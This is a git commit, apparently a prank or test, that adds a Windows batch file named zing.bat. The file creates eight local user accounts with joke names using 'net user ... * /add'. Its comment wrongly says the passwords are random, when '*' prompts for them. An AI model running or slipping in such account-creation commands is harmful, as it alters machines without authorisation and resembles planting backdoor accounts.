db338d40ec13175877eccb695c0330027e8f99b3
julian20yt <155905626+julian20yt@users.noreply.github.com>
2025-05-21 18:50:16 -0400

    sching

---
+++ zing.bat
@@ -0,0 +1,10 @@
+@echo off
+:: Create a new local user named "directv" with a random password
+net user directv * /add
+net user sampuckett * /add
+net user guhcdn * /add
+net user carlyshay * /add
+net user albuquerque * /add
+net user lewbert * /add
+net user chickenjockey * /add
+net user GuhCDN * /add
